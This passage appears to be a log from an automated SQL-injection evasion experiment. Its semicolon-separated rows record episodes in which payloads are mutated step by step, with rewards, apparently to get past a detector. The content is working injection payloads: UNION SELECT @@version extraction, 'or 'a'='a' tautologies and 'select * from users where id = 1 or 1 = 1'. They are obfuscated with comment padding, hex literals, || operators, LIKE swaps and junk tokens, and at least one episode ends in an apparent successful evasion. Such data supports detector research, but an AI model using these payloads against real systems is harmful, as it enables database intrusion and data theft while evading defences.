0#(Obk=(
(#Q**L$JN
OR#Q**L$JN
0#(Obk=(
select#Q**L$JN
OR#Q**L$JN
0#(Obk=(
NULL,#Q**L$JN
OR#Q**L$JN
0#(Obk=(
NULL,#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
(#Q**L$JN
OR#Q**L$JN
0#(Obk=(
select#Q**L$JN
OR#Q**L$JN
0#(Obk=(
@@version#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
)#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
)#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
--""*";13;"""'#Q**L$JN
OR#Q**L$JN
0#(Obk=(
union#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
(#Q**L$JN
OR#Q**L$JN
0#(Obk=(
select#Q**L$JN
OR#Q**L$JN
0#(Obk=(
NULL,#Q**L$JN
OR#Q**L$JN
0#(Obk=(
NULL,#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
(#Q**L$JN
OR#Q**L$JN
0#(Obk=(
select#Q**L$JN
OR#Q**L$JN
0#(Obk=(
@@version#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
)#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
)#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
--""*";-2.8667903497815135;0
29;1;30;"""' union  ( select NULL, NULL,  ( select @@version  )  )   --""";"""'#Q**L$JN
OR#Q**L$JN
0#(Obk=(
union#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
(#Q**L$JN
OR#Q**L$JN
0#(Obk=(
select#Q**L$JN
OR#Q**L$JN
0#(Obk=(
NULL,#Q**L$JN
OR#Q**L$JN
0#(Obk=(
NULL,#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
(#Q**L$JN
OR#Q**L$JN
0#(Obk=(
select#Q**L$JN
OR#Q**L$JN
0#(Obk=(
@@version#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
)#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
)#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
--""*";9;"""'#Q**L$JN
OR#Q**L$JN
0#(Obk=(
union#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
(#Q**L$JN
OR#Q**L$JN
0#(Obk=(
select#Q**L$JN
OR#Q**L$JN
0#(Obk=(
NULL,#Q**L$JN
OR#Q**L$JN
0#(Obk=(
NULL,#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
(#Q**L$JN
OR#Q**L$JN
0#(Obk=(
select#Q**L$JN
OR#Q**L$JN
0#(Obk=(
@@version#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
)#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
)#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
#Q**L$JN
OR#Q**L$JN
0#(Obk=(
--""*";-2.9667903497815136;0
30;2;1; or 'a' = 'a; or 'a' = 'a;0;/**/or/**/'a'/**/=/**/'a;-0.625;0
31;2;2; or 'a' = 'a;/**/or/**/'a'/**/=/**/'a;13;/**/or/**/'a'/**/=/**/'a;-0.725;0
32;2;3; or 'a' = 'a;/**/or/**/'a'/**/=/**/'a;7;/**/or/**/'a'/**/=/**/'a;-0.825;0
33;2;4; or 'a' = 'a;/**/or/**/'a'/**/=/**/'a;10;/**/or/**/'a'/**/=/**/'a;-0.925;0
34;2;5; or 'a' = 'a;/**/or/**/'a'/**/=/**/'a;18;/**/or/**/'a'/**/=/**/'a;-1.025;0
35;2;6; or 'a' = 'a;/**/or/**/'a'/**/=/**/'a;3;/**/or/**/'a'/**/=/**/'a;-1.125;0
36;2;7; or 'a' = 'a;/**/or/**/'a'/**/=/**/'a;2;/**/or/**/'a'/**/ LIKE /**/'a;-1.0827586114406587;0
37;2;8; or 'a' = 'a;/**/or/**/'a'/**/ LIKE /**/'a;12;/**/or/**/'a'/**/ LIKE /**/'a;-1.183870953321457;0
38;2;9; or 'a' = 'a;/**/or/**/'a'/**/ LIKE /**/'a;24;/**/or/**/'a'/**/ LIKE /**/'a;-1.283870953321457;0
39;2;10; or 'a' = 'a;/**/or/**/'a'/**/ LIKE /**/'a;25;/**/or/**/'a'/**/ LIKE /**/'a;-1.3838709533214568;0
40;2;11; or 'a' = 'a;/**/or/**/'a'/**/ LIKE /**/'a;19;/**/or/**/'a'/**/ LIKE /**/'a;-1.483870953321457;0
41;2;12; or 'a' = 'a;/**/or/**/'a'/**/ LIKE /**/'a;21;/**/or/**/'a'/**/ LIKE /**/'a;-1.583870953321457;0
42;2;13; or 'a' = 'a;/**/or/**/'a'/**/ LIKE /**/'a;25;/**/or/**/'a'/**/ LIKE /**/'a;-1.683870953321457;0
43;2;14; or 'a' = 'a;/**/or/**/'a'/**/ LIKE /**/'a;16;/**/or/**/'a'/**/ LIKE /**/'a;-1.783870953321457;0
44;2;15; or 'a' = 'a;/**/or/**/'a'/**/ LIKE /**/'a;2;/**/or/**/'a'/**/ LIKE /**/'a;-1.883870953321457;0
45;2;16; or 'a' = 'a;/**/or/**/'a'/**/ LIKE /**/'a;0;/**/or/**/'a'/**//**/LIKE/**//**/'a;-2.013513505458832;0
46;2;17; or 'a' = 'a;/**/or/**/'a'/**//**/LIKE/**//**/'a;13;/**/or/**/'a'/**//**/LIKE/**//**/'a;-2.113513505458832;0
47;2;18; or 'a' = 'a;/**/or/**/'a'/**//**/LIKE/**//**/'a;18;/**/or/**/'a'/**//**/LIKE/**//**/'a;-2.213513505458832;0
48;2;19; or 'a' = 'a;/**/or/**/'a'/**//**/LIKE/**//**/'a;6;/**/ || /**/'a'/**//**/LIKE/**//**/'a;-2.158974367380142;0
49;2;20; or 'a' = 'a;/**/ || /**/'a'/**//**/LIKE/**//**/'a;14;"/**/#'p::b
||#'p::b
/**/'a'/**//**/LIKE/**//**/'a";-2.1941176593303684;0
50;2;21; or 'a' = 'a;"/**/#'p::b
||#'p::b
/**/'a'/**//**/LIKE/**//**/'a";6;"/**/#'p::b
||#'p::b
/**/'a'/**//**/LIKE/**//**/'a";-2.294117659330368;0
51;2;22; or 'a' = 'a;"/**/#'p::b
||#'p::b
/**/'a'/**//**/LIKE/**//**/'a";14;"/**/#'p::b
||#'p::b
/**/'a'/**//**/LIKE/**//**/'a";-2.394117659330368;0
52;2;23; or 'a' = 'a;"/**/#'p::b
||#'p::b
/**/'a'/**//**/LIKE/**//**/'a";3;"/**/#'p::b
||#'p::b
/**/'a'/**//**/LIKE/**//**/'a";-2.494117659330368;0
53;2;24; or 'a' = 'a;"/**/#'p::b
||#'p::b
/**/'a'/**//**/LIKE/**//**/'a";1;" #'p::b
||#'p::b
 'a'  LIKE  'a";-2.421212124824524;0
54;2;25; or 'a' = 'a;" #'p::b
||#'p::b
 'a'  LIKE  'a";16;" #'p::b
||#'p::b
 'a'  LIKE  'a]j";-2.514285714924336;0
55;2;26; or 'a' = 'a;" #'p::b
||#'p::b
 'a'  LIKE  'a]j";14;"#I0j+?
#'p::b
||#'p::b
#I0j+?
'a'#I0j+?
#I0j+?
LIKE#I0j+?
#I0j+?
'a]j";150.0;1
56;3;1; select * from users where id = 1 or $ 1 = 1 or 1 = 1 -- 1; select * from users where id = 1 or $ 1 = 1 or 1 = 1 -- 1;19; select * from users where id = 1 or $ 1 = 1 or 1 = 1 -- 1;-0.6206896305084229;0
57;3;2; select * from users where id = 1 or $ 1 = 1 or 1 = 1 -- 1; select * from users where id = 1 or $ 1 = 1 or 1 = 1 -- 1;0;/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/1/**/or/**/$/**/1/**/=/**/1/**/or/**/1/**/=/**/1/**/--/**/1;-0.6391304492950439;0
58;3;3; select * from users where id = 1 or $ 1 = 1 or 1 = 1 -- 1;/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/1/**/or/**/$/**/1/**/=/**/1/**/or/**/1/**/=/**/1/**/--/**/1;5;/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/1/**/or/**/$/**/1/**/=/**/1/**/or/**/1/**/=/**/1/**/--/**/1;-0.7391304492950439;0
59;3;4; select * from users where id = 1 or $ 1 = 1 or 1 = 1 -- 1;/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/1/**/or/**/$/**/1/**/=/**/1/**/or/**/1/**/=/**/1/**/--/**/1;14;/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/1/**/or/**/$/**/1/**/=/**/1/**/or/**/1/**/=/**/1/**/--/**/1;-0.839130449295044;0
60;3;5; select * from users where id = 1 or $ 1 = 1 or 1 = 1 -- 1;/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/1/**/or/**/$/**/1/**/=/**/1/**/or/**/1/**/=/**/1/**/--/**/1;7;/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/0x1/**/or/**/$/**/0x1/**/=/**/0x1/**/or/**/0x1/**/=/**/0x1/**/--/**/1;-0.7840000033378601;0
61;3;6; select * from users where id = 1 or $ 1 = 1 or 1 = 1 -- 1;/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/0x1/**/or/**/$/**/0x1/**/=/**/0x1/**/or/**/0x1/**/=/**/0x1/**/--/**/1;17;/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/0x1/**/or/**/$/**/0x1/**/=/**/0x1/**/or/**/0x1/**/=/**/0x1/**/--/**/1;-0.8840000033378601;0
62;3;7; select * from users where id = 1 or $ 1 = 1 or 1 = 1 -- 1;/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/0x1/**/or/**/$/**/0x1/**/=/**/0x1/**/or/**/0x1/**/=/**/0x1/**/--/**/1;1; select * from users where id = 0x1 or $ 0x1 = 0x1 or 0x1 = 0x1 -- 1;-1.0264705777168275;0
63;3;8; select * from users where id = 1 or $ 1 = 1 or 1 = 1 -- 1; select * from users where id = 0x1 or $ 0x1 = 0x1 or 0x1 = 0x1 -- 1;6; select * from users where id = 0x1  ||  $ 0x1 = 0x1  ||  0x1 = 0x1 -- 1;-1.0750000000000002;0
64;3;9; select * from users where id = 1 or $ 1 = 1 or 1 = 1 -- 1; select * from users where id = 0x1  ||  $ 0x1 = 0x1  ||  0x1 = 0x1 -- 1;6; select * from users where id = 0x1  ||  $ 0x1 = 0x1  ||  0x1 = 0x1 -- 1;-1.175;0
65;3;10; select * from users where id = 1 or $ 1 = 1 or 1 = 1 -- 1; select * from users where id = 0x1  ||  $ 0x1 = 0x1  ||  0x1 = 0x1 -- 1;0;/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/0x1/**//**/||/**//**/$/**/0x1/**/=/**/0x1/**//**/||/**//**/0x1/**/=/**/0x1/**/--/**/1;-1.2404255211353301;0
66;3;11; select * from users where id = 1 or $ 1 = 1 or 1 = 1 -- 1;/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/0x1/**//**/||/**//**/$/**/0x1/**/=/**/0x1/**//**/||/**//**/0x1/**/=/**/0x1/**/--/**/1;22;/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/0x1/**//**/||/**//**/$/**/0x1/**/=/**/0x1/**//**/||/**//**/0x1/**/=/**/0x1/**/--/**/1;-1.3404255211353302;0
67;3;12; select * from users where id = 1 or $ 1 = 1 or 1 = 1 -- 1;/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/0x1/**//**/||/**//**/$/**/0x1/**/=/**/0x1/**//**/||/**//**/0x1/**/=/**/0x1/**/--/**/1;24;/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/0x1/**//**/||/**//**/$/**/0x1/**/=/**/0x1/**//**/||/**//**/0x1/**/=/**/0x1/**/--/**/1;-1.4404255211353303;0
68;3;13; select * from users where id = 1 or $ 1 = 1 or 1 = 1 -- 1;/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/0x1/**//**/||/**//**/$/**/0x1/**/=/**/0x1/**//**/||/**//**/0x1/**/=/**/0x1/**/--/**/1;0;/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/0x1/**//**/||/**//**/$/**/0x1/**/=/**/0x1/**//**/||/**//**/0x1/**/=/**/0x1/**/--/**/1;-1.5404255211353304;0
69;3;14; select * from users where id = 1 or $ 1 = 1 or 1 = 1 -- 1;/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/0x1/**//**/||/**//**/$/**/0x1/**/=/**/0x1/**//**/||/**//**/0x1/**/=/**/0x1/**/--/**/1;12;/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/0x1/**//**/||/**//**/$/**/0x1/**/=/**/0x1/**//**/||/**//**/0x1/**/=/**/0x1/**/--/**/1;-1.6404255211353302;0
70;3;15; select * from users where id = 1 or $ 1 = 1 or 1 = 1 -- 1;/**/select/**/*/**/from/**/users/**/where/**/id/**/=/**/0x1/**//**/||/**//**/$/**/0x1/**/=/**/0x1/**//**/||/**//**/0x1/**/=/**/0x1/**/--/**/1;1; select * from users where id = 0x1  ||  $ 0x1 = 0x1  ||  0x1 = 0x1 -- 1;-1.7750000000000001;0
71;3;16; select * from users where id = 1 or $ 1 = 1 or 1 = 1 -- 1; select * from users where id = 0x1  ||  $ 0x1 = 0x1  ||  0x1 = 0x1 -- 1;5; select * from users where id = 0x1  ||  $ 0x1 = 0x1  ||  0x1 = 0x1 -- 1;-1.875;0
72;3;17; select * from users where id = 1 or $ 1 = 1 or 1 = 1 -- 1; select * from users where id = 0x1  ||  $ 0x1 = 0x1  ||  0x1 = 0x1 -- 1;7; select * from users where id = 0x1  ||  $ 0x1 = 0x1  ||  0x1 = 0x1 -- 1;-1.975;0
73;3;18; select * from users where id = 1 or $ 1 = 1 or 1 = 1 -- 1; select * from users where id = 0x1  ||  $ 0x1 = 0x1  ||  0x1 = 0x1 -- 1;13;  select  *  from  users  where  id  =  0x1    ||    $  0x1  =  0x1    ||    0x1  =  0x1  --  1;-2.0263157904148104;0
74;3;19; select * from users where id = 1 or $ 1 = 1 or 1 = 1 -- 1;  select  *  from  users  where  id  =  0x1    ||    $  0x1  =  0x1    ||    0x1  =  0x1  --  1;2;  select  *  from  users  where  id   LIKE   0x1    ||    $  0x1   LIKE   0x1    ||    0x1   LIKE   0x1  --  1;-2.1090909123420714;0
75;3;20; select * from users where id = 1 or $ 1 = 1 or 1 = 1 -- 1;  select  *  from  users  where  id   LIKE   0x1    ||    $  0x1   LIKE   0x1    ||    0x1   LIKE   0x1  --  1;3;  select  *  from  users  where  id   LIKE   0x1    ||    $  0x1   LIKE   0x1    ||    0x1   LIKE   0x1  --  1;-2.209090912342072;0
76;3;21; select * from users where id = 1 or $ 1 = 1 or 1 = 1 -- 1;  select  *  from  users  where  id   LIKE   0x1    ||    $  0x1   LIKE   0x1    ||    0x1   LIKE   0x1  --  1;13;    select    *    from    users    where    id      LIKE      0x1        ||        $    0x1      LIKE      0x1        ||        0x1      LIKE      0x1    --    1;-2.2283950597047806;0
77;3;22; select * from users where id = 1 or $ 1 = 1 or 1 = 1 -- 1;    select    *    from    users    where    id      LIKE      0x1        ||        $    0x1      LIKE      0x1        ||        0x1      LIKE      0x1    --    1;23;    select    *    from    users    where    id      LIKE      0x1        ||        $    0x1      LIKE      0x1        ||        0x1      LIKE      0x1    --    1;-2.3283950597047807;0
78;3;23; select * from users where id = 1 or $ 1 = 1 or 1 = 1 -- 1;    select    *    from    users    where    id      LIKE      0x1        ||        $    0x1      LIKE      0x1        ||        0x1      LIKE      0x1    --    1;0;/**//**//**//**/select/**//**//**//**/*/**//**//**//**/from/**//**//**//**/users/**//**//**//**/where/**//**//**//**/id/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**//**//**//**//**/||/**//**//**//**//**//**//**//**/$/**//**//**//**/0x1/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**//**//**//**//**/||/**//**//**//**//**//**//**//**/0x1/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**/--/**//**//**//**/1;-2.4594936788082125;0
79;3;24; select * from users where id = 1 or $ 1 = 1 or 1 = 1 -- 1;/**//**//**//**/select/**//**//**//**/*/**//**//**//**/from/**//**//**//**/users/**//**//**//**/where/**//**//**//**/id/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**//**//**//**//**/||/**//**//**//**//**//**//**//**/$/**//**//**//**/0x1/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**//**//**//**//**/||/**//**//**//**//**//**//**//**/0x1/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**/--/**//**//**//**/1;3;/**//**//**//**/select/**//**//**//**/*/**//**//**//**/from/**//**//**//**/users/**//**//**//**/where/**//**//**//**/id/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**//**//**//**//**/||/**//**//**//**//**//**//**//**/$/**//**//**//**/0x1/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**//**//**//**//**/||/**//**//**//**//**//**//**//**/0x1/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**/--/**//**//**//**/1;-2.5594936788082125;0
80;3;25; select * from users where id = 1 or $ 1 = 1 or 1 = 1 -- 1;/**//**//**//**/select/**//**//**//**/*/**//**//**//**/from/**//**//**//**/users/**//**//**//**/where/**//**//**//**/id/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**//**//**//**//**/||/**//**//**//**//**//**//**//**/$/**//**//**//**/0x1/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**//**//**//**//**/||/**//**//**//**//**//**//**//**/0x1/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**/--/**//**//**//**/1;15;/**//**//**//**/select/**//**//**//**/*/**//**//**//**/from/**//**//**//**/users/**//**//**//**/where/**//**//**//**/id/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**//**//**//**//**/||/**//**//**//**//**//**//**//**/$/**//**//**//**/0x1/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**//**//**//**//**/||/**//**//**//**//**//**//**//**/0x1/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**/--/**//**//**//**/1;-2.6594936788082126;0
81;3;26; select * from users where id = 1 or $ 1 = 1 or 1 = 1 -- 1;/**//**//**//**/select/**//**//**//**/*/**//**//**//**/from/**//**//**//**/users/**//**//**//**/where/**//**//**//**/id/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**//**//**//**//**/||/**//**//**//**//**//**//**//**/$/**//**//**//**/0x1/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**//**//**//**//**/||/**//**//**//**//**//**//**//**/0x1/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**/--/**//**//**//**/1;25;/**//**//**//**/select/**//**//**//**/*/**//**//**//**/from/**//**//**//**/users/**//**//**//**/where/**//**//**//**/id/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**//**//**//**//**/||/**//**//**//**//**//**//**//**/$/**//**//**//**/0x1/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**//**//**//**//**/||/**//**//**//**//**//**//**//**/0x1/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**/--/**//**//**//**/1;-2.7594936788082123;0
82;3;27; select * from users where id = 1 or $ 1 = 1 or 1 = 1 -- 1;/**//**//**//**/select/**//**//**//**/*/**//**//**//**/from/**//**//**//**/users/**//**//**//**/where/**//**//**//**/id/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**//**//**//**//**/||/**//**//**//**//**//**//**//**/$/**//**//**//**/0x1/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**//**//**//**//**/||/**//**//**//**//**//**//**//**/0x1/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**/--/**//**//**//**/1;18;/**//**//**//**/select/**//**//**//**/*/**//**//**//**/from/**//**//**//**/users/**//**//**//**/where/**//**//**//**/id/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**//**//**//**//**/||/**//**//**//**//**//**//**//**/$/**//**//**//**/0x1/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**//**//**//**//**/||/**//**//**//**//**//**//**//**/0x1/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**/--/**//**//**//**/1;-2.8594936788082124;0
83;3;28; select * from users where id = 1 or $ 1 = 1 or 1 = 1 -- 1;/**//**//**//**/select/**//**//**//**/*/**//**//**//**/from/**//**//**//**/users/**//**//**//**/where/**//**//**//**/id/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**//**//**//**//**/||/**//**//**//**//**//**//**//**/$/**//**//**//**/0x1/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**//**//**//**//**/||/**//**//**//**//**//**//**//**/0x1/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**/--/**//**//**//**/1;24;/**//**//**//**/select/**//**//**//**/*/**//**//**//**/from/**//**//**//**/users/**//**//**//**/where/**//**//**//**/id/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**//**//**//**//**/||/**//**//**//**//**//**//**//**/$/**//**//**//**/0x1/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**//**//**//**//**/||/**//**//**//**//**//**//**//**/0x1/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**/--/**//**//**//**/1;-2.9594936788082125;0
84;3;29; select * from users where id = 1 or $ 1 = 1 or 1 = 1 -- 1;/**//**//**//**/select/**//**//**//**/*/**//**//**//**/from/**//**//**//**/users/**//**//**//**/where/**//**//**//**/id/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**//**//**//**//**/||/**//**//**//**//**//**//**//**/$/**//**//**//**/0x1/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**//**//**//**//**/||/**//**//**//**//**//**//**//**/0x1/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**/--/**//**//**//**/1;6;/**//**//**//**/select/**//**//**//**/*/**//**//**//**/from/**//**//**//**/users/**//**//**//**/where/**//**//**//**/id/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**//**//**//**//**/||/**//**//**//**//**//**//**//**/$/**//**//**//**/0x1/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**//**//**//**//**/||/**//**//**//**//**//**//**//**/0x1/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**/--/**//**//**//**/1;-3.0594936788082125;0
85;3;30; select * from users where id = 1 or $ 1 = 1 or 1 = 1 -- 1;/**//**//**//**/select/**//**//**//**/*/**//**//**//**/from/**//**//**//**/users/**//**//**//**/where/**//**//**//**/id/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**//**//**//**//**/||/**//**//**//**//**//**//**//**/$/**//**//**//**/0x1/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**//**//**//**//**/||/**//**//**//**//**//**//**//**/0x1/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**/--/**//**//**//**/1;12;/**//**//**//**/select/**//**//**//**/*/**//**//**//**/from/**//**//**//**/users/**//**//**//**/where/**//**//**//**/id/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**//**//**//**//**/||/**//**//**//**//**//**//**//**/$/**//**//**//**/0x1/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**//**//**//**//**/||/**//**//**//**//**//**//**//**/0x1/**//**//**//**//**//**/LIKE/**//**//**//**//**//**/0x1/**//**//**//**/--/**//**//**//**/1;-3.1594936788082126;0
